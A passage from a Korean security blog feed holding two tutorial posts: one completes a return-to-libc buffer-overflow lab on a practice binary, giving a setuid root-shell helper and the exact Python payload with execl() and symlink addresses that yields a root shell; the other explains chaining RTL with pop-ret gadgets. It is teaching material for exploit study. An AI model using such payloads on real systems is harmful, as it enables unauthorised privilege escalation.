&lt;p&gt;system()의 주소는 알고 있으니 환경변수의 주소만 추가해서 바로 페이로드를 작성하고 떄려봅시다&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-10.png&quot; alt=&quot;[그림 4-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;shell은 마찬가지로 잘 떨어집니다만…우리가 원하는 root 권한이 아니라서 아쉽습니다…..ㅠ 아쉬움을 달래봅시다.&lt;/p&gt;

&lt;p&gt;우선 system()의 근본적인 문제를 알아 봅시다.&lt;/p&gt;

&lt;p&gt;system()의 경우 내부적으로 &lt;strong&gt;/bin/sh -c argument&lt;/strong&gt;를 실행합니다.
따라서 &lt;strong&gt;/bin/sh -c /bin/sh&lt;/strong&gt; 로 처리가 되며, root 권한을 얻는것은 system()의 내부에서 /bin/sh를 실행 후 다시 /bin/sh을 실행하기에 불가능합니다. 
따라서 &lt;strong&gt;setuid()&lt;/strong&gt;함수 를 0으로 셋팅해주고 system()가 실행되도록 하여 &lt;strong&gt;미리 실행전에 root 권한으로 준비시킨 후 system()을 실행&lt;/strong&gt;시킨다면 가능하며 system() 함수의 주소가 아닌 다른 함수가 필요한데 그것이 &lt;strong&gt;execl()&lt;/strong&gt;함수입니다.
먼저 setuid()를 셋팅해 줄 소스부터 작성 해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01 #include &amp;lt;stdio.h&amp;gt;
02 
03 int main(){
04   setuid(0);
05 	 system(&quot;/bin/sh&quot;);
06   return 0;
07 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;해당 파일을 컴파일해주시고 마찬가지로 환경변수에 저장 해줍니다. execl()의 주소도 위에서 system() 주소값을 찾았던 방식으로 찾아주시면 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-11.png&quot; alt=&quot;[그림 4-11]&quot; /&gt;
&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;execl()&lt;/strong&gt; 주소 = &lt;strong&gt;0x420acaa0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;새로 작성한 &lt;strong&gt;/tmp/bof1/rootsh&lt;/strong&gt; 주소 = &lt;strong&gt;??&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이제 페이로드를 짜야 하는데 한가지 주의점은 execl()은 끝에 null로 끝나야 합니다.
execl(const char *path, const char *arg0, const char *arg1, const char *arg2,…const char *argn, (char *)0);의 형태로 구성 되있는데 조금더 보기 쉽게 하자면
execl(경로, 인자1, 인자2….인자n, null) 이라고 이해하시면 됩니다. 마지막은 인자의 끝을 의미로 null값이 위치하게 됩니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 `python -c 'print &quot;AAAA&quot;*11 + &quot;execl주소&quot; + &quot;AAAA&quot; + &quot;rootsh 주소&quot;'`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;공격 페이로드는 위와 같이 구성 될것입니다.&lt;/p&gt;

&lt;p&gt;페이로드 전에 execl()을 사용하기 위해 메모리 상태를 봐야합니다. 이유는 끝이 null값으로 끝나는 적당한 지점을 골라야 하기 때문입니다. 직접 보는게 이해하기 빠를겁니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-12.png&quot; alt=&quot;[그림 4-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위에서 그림과 같이 BBBB는 execl()의 주소가 되며(파란색) CCCC는 불필요한 값이며(초록색) DDDD가 새로 작성한 rootsh의 주소(노란색)가 됩니다. 위에서 execl()의 인자값의 형태를 봤습니다. 경로 + 인자1 + 인자2 +인자n + NULL의 형태를 띄우며 DDDD 하나는 경로에 들어가며 DDDD가 하나더 들어가면 인자 1에 들어갑니다. 그렇다는 것은 마지막이 마지막으로 DDDD의 뒤의 한 바이트는 NULL이 되어야 4바이트가 전부 NULL로 자리를 잡게 됩니다. 다음 그림과 위 그림의 하늘색 박스의 1byte값인 2c를 확인해보면 무슨 말인지 이해 되실거라 생각 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-13.png&quot; alt=&quot;[그림 4-13]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;상단에 입력한 페이로드를 보면 DDDD를 &lt;em&gt;2 했으며 아래쪽에 하늘색 박스가 2c가 아닌 00으로 바뀌었음을 확인 간으합니다. 즉 DDDD DDDD가 들어간 다음 1byte는 NULL로 바꾸게 됩니다. 이제 DDDD&lt;/em&gt;3을 입력하여 우리가 원하는 0xbffffe4a0(보라색)의 값이 바뀌는지 확인하도록 합시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-14.png&quot; alt=&quot;[그림 4-14]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;우리가 원하는 모양으로 메모리 값이 바뀌는걸 확인 했으니 페이로드를 다시 정리 해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 &quot;`python -c 'print &quot;AAAA&quot;*11 + &quot;\xa0\xca\x0a\x42&quot; + &quot;AAAA&quot; + &quot;rootsh 주소&quot;*3'`&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이제 rootsh 의 주소를 알아내고 *3만 붙여주면 될 듯 합니다. 고지가 보이네요.&lt;/p&gt;

&lt;p&gt;위에서 작성하고 컴파일한 rootsh를 주소가 변하지않는 값을 찾아서 심볼릭 링크를 걸어줘야 합니다. 변하지 않는 곳은 Data segment 영역입니다.&lt;/p&gt;

&lt;p&gt;Data segment 영역의 주소는 0x08049000 부터 시작합니다. 해당 주소를 dbg를 이용해서 열어보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-15.png&quot; alt=&quot;[그림 4-15]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0x08049014 주소의 값이 0x01(=0x00000001)을 갖고있습니다. 다른 값을 쓰셔도 됩니다만 입력에 있어서 편안한 간단한 값을 선택 합니다. 0x08049014 = 0x01 이라는것을 알아 두시면 됩니다. 이제 rootsh 코드와 0x01의 주소를 심볼릭 링크 시켜줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-16.png&quot; alt=&quot;[그림 4-16]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;자 이제 준비가 끝났습니다. 위에서 찾아본 내용을 바탕으로 페이로드를 재구성 해보겠습니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;execl()&lt;/strong&gt; 주소 = &lt;strong&gt;0x420acaa0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/tmp/bof1/rootsh 심볼릭 링크 주소&lt;/strong&gt; = &lt;strong&gt;0x08049014&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;[AAAA(44byte)] + [execl() 주소] + [잉여값(4byte)] + [rootsh sl 주소] 과 구성되며 실제 공격 페이로드는 아래와 같습니다.(공격 페이로드는 root 권한의 파일을 대상으로 확인하셔야 합니다.)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;../bof/bof1 &quot;`python -c 'print &quot;AAAA&quot;*11 + &quot;\xa0\xca\x0a\x42&quot; + &quot;AAAA&quot; 
+ &quot;\x14\x90\x04\x08&quot;*3'`&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이때 주의할 점은 페이로드 전체를 ““로 감싸야 합니다. \x0a를 \x00으로 인식하는 문제가 있어서 “&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'print .......'&lt;/code&gt;” 이런식로 감싸주셔야 똑바로 값이 들어갑니다. 꼭 ““으로 감싸주세요!&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-17.png&quot; alt=&quot;[그림 4-17]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;짜잔….개…root 권한으로 shell을 땄습니다. 
이번에도 역시나 간단하게 하고 싶었는데 고생도 하느라 이것저것 실수 했던것들 다 담느라 많이 길어졌네요…..ㅂㄷㅂㄷ….&lt;/p&gt;

&lt;p&gt;RTL이란 기법은 나중에 알아볼 ROP를 위한 초석입니다. 꼭 잘 숙지 해주셔야 합니다….. :(&lt;/p&gt;

&lt;p&gt;다음 포스팅은 Chaining RTL이란 것을 정말…간단히 볼 수 있도록 해보겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;뿅!&lt;/strong&gt;&lt;/p&gt;</content><author><name>Sulla</name></author><category term="Posts" /><summary type="html">RTL(Return to Library)</summary></entry><entry><title type="html">windows-0x08</title><link href="http://localhost:4000/windows-0x08" rel="alternate" type="text/html" title="windows-0x08" /><published>2019-03-19T20:18:00+09:00</published><updated>2019-03-19T20:18:00+09:00</updated><id>http://localhost:4000/windows-0x08</id><content type="html" xml:base="http://localhost:4000/windows-0x08">&lt;h1 id=&quot;0x08-dep2&quot;&gt;0x08 DEP(2)&lt;/h1&gt;

&lt;h5 id=&quot;what-is-dep&quot;&gt;What is DEP?&lt;/h5&gt;

&lt;p&gt;지난 Post에서 RTL을 다루어 봤습니다.&lt;/p&gt;

&lt;p&gt;이번 시간에는 RTL에 이어 Chaining RTL에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;chaining-rtl&quot;&gt;Chaining RTL&lt;/h5&gt;

&lt;p&gt;Chaining RTL은 RTL이 Chain처럼 엮여서 반복되는 것을 말합니다.&lt;/p&gt;

&lt;p&gt;RTL이 뭐였죠? DEP가 적용되어 Shellcode를 실행할 수 없게 되었을 때, 라이브러리 함수로 점프하여&lt;/p&gt;

&lt;p&gt;내가 원하는 함수를 실행하는 것이었죠?&lt;/p&gt;

&lt;p&gt;Chaining RTL은 말 그대로 내가 원하는 함수를 계속해서 실행하는 것을 뜻합니다.&lt;/p&gt;

&lt;p&gt;의미는 알았으니, 본격적으로 알아볼텐데 STACK 구성에 집중해서 보시면 되겠습니다.&lt;/p&gt;

&lt;p&gt;먼저, 지난 시간처럼 몇 가지 가정을 하겠습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;func1(argv1) : 인자를 하나만 필요로 하는 함수&lt;/li&gt;
  &lt;li&gt;func2(argv1’, argv’2) : 인자를 두 개 필요로 하는 함수&lt;/li&gt;
  &lt;li&gt;func3(argv’‘1, argv’‘2, argv’‘3) : 인자를 세 개 필요로 하는 함수&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이 함수들을 차례대로 호출한다고 가정하고 이 때, Payload를 어떻게 구성해야하는 것인지를 살펴보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이 그림 기억나시나요?? 지난 시간에 살펴봤던 함수를 하나만 호출할 때의 STACK 그림입니다.&lt;/p&gt;

&lt;p&gt;Main-ret가 다음 호출할 함수의 SFP로 변경되고 있죠? 그래서 그 다음 4 Byte가 호출된 함수가 종료되고 다음에 갈 곳의 주소인 것도 알고 있습니다.&lt;/p&gt;

&lt;p&gt;그럼 두 번째 함수(인자가 두 개)를 호출할 때 그림이 이렇게 되겠네요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_1.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Func1() 함수의 RET 자리에 Func2() 함수의 주소를 넣어줬습니다. 그럼 Func1() 함수가 종료된 후, Func2() 함수가 실행됩니다.&lt;/p&gt;

&lt;p&gt;간단하죠?&lt;/p&gt;

&lt;p&gt;그런데 여기엔 문제가 있습니다. 이 방법으로는 내가 원하는 함수를 마음껏 호출할 수가 없습니다.&lt;/p&gt;

&lt;p&gt;그냥 RET에 다른 함수 주소를 덮어주면 되는거 아니야? 라고 생각하실 수 있습니다.&lt;/p&gt;

&lt;p&gt;자, 그럼 다음에 Func3() 함수를 호출한다고 생각해봅시다.&lt;/p&gt;

&lt;p&gt;Func3() 함수의 주소는 어디에 넣어줘야 하죠?&lt;/p&gt;

&lt;p&gt;이미 Func1() 함수의 첫 번째 인자가 위치하고 있습니다. 이제 이해가 가시죠??&lt;/p&gt;

&lt;p&gt;이 한계를 해결하기 위해 지금부터는 Gadget을 사용할 겁니다.&lt;/p&gt;

&lt;p&gt;RET로 끝나는 많고 많은 Gadget 중에 시스템 해킹에서 주로 사용되는 Gadget은 다음 3가지 입니다.
(이것만 쓴다는 게 아닙니다!!)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;pr : POP RET&lt;/li&gt;
  &lt;li&gt;ppr : POP POP RET&lt;/li&gt;
  &lt;li&gt;pppr : POP POP POP RET&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;POP 뒤에 Operand는 생략했습니다.&lt;/p&gt;

&lt;p&gt;이 Gadget을 이용해서 내가 원하는만큼 함수를 호출하려면 STACK을 다음과 같이 구성하면 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_2.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;조금 이상하고 복잡한 듯이 느껴질 수 있는데, 에필로그 과정부터 Gadget 순으로 색깔별로 보시면 됩니다.&lt;/p&gt;

&lt;p&gt;먼저 에필로그부터 살펴보겠습니다.&lt;/p&gt;

&lt;p&gt;RETN이 실행되면 POP EIP, JMP EIP를 수행하므로 실행되고 난 후, ESP의 위치는 빨간 ESP 위치가 됩니다.&lt;/p&gt;

&lt;p&gt;JMP EIP가 실행되면 POP RETN이 실행되겠죠?&lt;/p&gt;

&lt;p&gt;처음 POP이 실행되면 STACK 최상단의 값을 꺼내고 ESP가 올라가면서 ESP의 위치는 파란 ESP 위치가 됩니다.&lt;/p&gt;

&lt;p&gt;다시 RETN이 실행되면 POP EIP, JMP EIP가 실행되겠네요.&lt;/p&gt;

&lt;p&gt;그럼 그 때의 ESP는 초록색 위치가 되는데 POP EIP를 했으므로 EIP엔 두 번째 함수 Func2()의 주소가 들어가게 될 것이고&lt;/p&gt;

&lt;p&gt;JMP EIP를 하면서 Func2() 함수가 실행됩니다.&lt;/p&gt;

&lt;p&gt;세 번째 함수까지 모두 호출한다고 가정했을 때, STACK의 구조는 다음과 같이 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_3.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이런 식으로 STACK을 구성해서 내가 원하는 함수를 계속해서 호출하는 기법을 Chaining RTL이라고 부릅니다.&lt;/p&gt;

&lt;p&gt;자, 이제 ROP를 하기 위한 기초 준비 작업을 모두 마쳤습니다.&lt;/p&gt;

&lt;p&gt;다음 Post에서 ROP를 알아보고 DEP편을 마무리 짓도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x08 DEP(2)</summary></entry></feed>